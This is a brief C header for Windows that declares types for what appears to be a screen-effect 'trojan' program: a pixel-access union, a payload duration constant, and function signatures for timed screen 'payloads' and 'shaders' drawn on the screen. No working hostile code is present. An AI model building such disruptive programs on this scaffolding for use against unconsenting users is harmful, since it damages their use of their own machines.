#pragma once
#include <Windows.h>
#define PAYLOAD_TIME 30
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *PRGBQUAD;
typedef void(TROJAN_PAYLOAD)(int t, HDC hdcScreen);
typedef void(TROJAN_SHADER)(int t, int w, int h, PRGBQUAD prgbScreen);
